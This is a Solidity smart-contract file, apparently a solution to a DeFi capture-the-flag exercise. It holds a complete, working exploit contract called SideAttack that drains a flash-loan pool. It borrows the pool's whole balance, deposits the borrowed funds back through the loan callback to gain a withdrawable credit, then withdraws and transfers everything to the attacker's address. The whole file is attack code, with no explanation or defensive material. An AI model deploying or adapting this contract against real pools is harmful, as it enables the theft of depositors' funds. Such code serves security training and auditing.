// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

interface ISidePool{
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract SideAttack{
    using Address for address payable;

    ISidePool pool;

    constructor(
        ISidePool _pool
    ) {
        pool = _pool;
    }

    function attack() external {
        //get pool balance
        uint256 _poolBal = address(pool).balance;

        //take a flashLoan
        pool.flashLoan(_poolBal);

        //withdraw flashloan
        pool.withdraw();
        
        //transfer flashLoan into attackerEOA
        payable(msg.sender).transfer(address(this).balance);
        
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
        
    }

    receive () external payable {}
}